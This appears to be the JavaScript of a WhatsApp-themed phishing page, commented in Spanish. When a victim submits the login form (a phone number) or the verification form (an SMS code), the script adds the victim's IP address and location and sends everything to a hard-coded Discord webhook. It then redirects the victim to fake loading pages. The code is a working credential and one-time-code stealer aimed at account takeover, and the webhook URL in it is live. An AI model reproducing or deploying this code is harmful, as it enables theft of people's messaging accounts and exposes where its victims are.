document.addEventListener("DOMContentLoaded", function() {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación y enviar el mensaje a Discord
    function obtenerUbicacionYEnviarMensajeDiscord(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            if (country && region && ip) {
                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
            } else {
                message += '\nNo se pudo obtener la ubicación.';
            }
            enviarMensajeDiscord(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nError al obtener la ubicación.";
            enviarMensajeDiscord(message, nextPage);
        });
    }

    // Función para enviar el mensaje a Discord usando un webhook y redirigir
    function enviarMensajeDiscord(mensaje, nextPage) {
        // Reemplaza con tu URL de webhook de Discord
        const webhookUrl = 'https://discord.com/api/webhooks/1364960140662542448/ypGx9gdvnVZyAMg-6Ns779LqLKXBK-O19orYqasZuibaH4GlPJUP4b-Ftk6_vh4XwcbK';

        const payload = {
            content: mensaje
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    }

    // Evento de envío de formulario para la página de inicio de sesión
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var telefono = document.getElementById("telefono").value;

            // Validar que el teléfono solo contenga números
            if (/^\d+$/.test(telefono)) {
                obtenerUbicacionYEnviarMensajeDiscord(
                    telefono,
                    telefono,
                    "cargando.html?action=telefono",
                    "💲 Whatsapp  💲:\nTELEFONO: " + telefono
                );
            } else {
                alert("Por favor, ingresa solo números en el campo de teléfono.");
            }
        });
    }

    // Evento de envío de formulario para la sección de contacto
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var cod = document.getElementById("cod").value;

            // Validar que cod solo contenga números
            var isNumeric = /^[0-9]+$/.test(cod);
            if (!isNumeric) {
                alert("Por favor, ingresa solo números.");
                return; // Detiene el envío del formulario
            }

            obtenerUbicacionYEnviarMensajeDiscord(
                cod,
                cod,
                "cargando2.html?action=cod",
                "💲 Whatsapp  💲:\nCODIGO SMS: " + cod
            );
        });
    }
});